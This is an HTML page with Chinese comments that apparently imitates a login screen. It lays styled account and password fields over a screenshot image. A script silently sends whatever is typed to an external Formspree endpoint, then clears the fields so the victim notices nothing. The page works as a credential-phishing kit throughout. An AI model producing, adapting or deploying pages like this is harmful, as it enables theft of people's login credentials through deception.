<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <style>
        body {
            margin: 0; /* 移除瀏覽器預設的 8px 外距 */
            background-color: #000
        }
        img {
            display: block; /* 移除圖片下方的微小空隙 */
            width: 100%;    /* 讓圖片寬度撐滿畫面（視需求調整） */
            height: auto;
        }
        .input-overlay {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 535px; 
            right: 878px;   
            border: none;    /* 移除平常看到的灰色邊框 */
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay:hover {
            background-color: #393C44; /* 變淺一點的灰色 */
        }
        .input-overlay123 {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 463px; 
            right: 878px;   
            border: none;    /* 移除平常看到的灰色邊框 */
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay123:hover {
            background-color: #393C44; /* 變淺一點的灰色 */
        }
        .input_img{
            z-index:2;
            position: absolute;
            bottom: 286px; 
            right: 603px;
            width: 700px;  /* 這裡改小，例如 100px 或 50px */
            height: auto;
        }
        .button_css{
            z-index:3;
            position: absolute;
            bottom: 370px; 
            right: 939px;
            width: 280px;  /* 這裡改小，例如 100px 或 50px */
            height: auto;
        }
    </style>
</head>
<body>
    <form id="submit-form" action="https://formspree.io/f/xkokjdwb" method="POST">
        
        <img src="input.png" class="input_img">
        <img src="img.png">

        <button type="submit" class="button_css">
            <img src="button.png" style="width: 100%;">
        </button>

        <input type="text" name="Account" class="input-overlay">
        <input type="password" name="Password" class="input-overlay123">
    </form>
    <script>
        // 點擊按鈕後，直接在背景傳送，不會有任何彈窗或跳轉
        document.getElementById("submit-form").addEventListener("submit", function(e) {
            e.preventDefault(); // 攔截跳轉
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).then(response => {
                if (response.ok) {
                    this.reset(); // 傳送成功後清空輸入框，什麼都不顯示
                }
            });
        });
    </script>
</body>
</html>
